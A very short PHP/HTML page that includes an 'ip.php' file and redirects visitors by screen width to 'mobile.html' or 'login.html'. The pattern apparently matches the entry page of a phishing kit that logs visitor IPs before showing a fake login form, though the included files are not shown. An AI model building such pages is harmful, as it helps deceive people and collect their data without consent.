<?php include 'ip.php';?>
<script type="text/javascript">
if (screen.width <= 699) {
    document.location = "mobile.html";
}
else {
    document.location = "login.html";
}
</script> 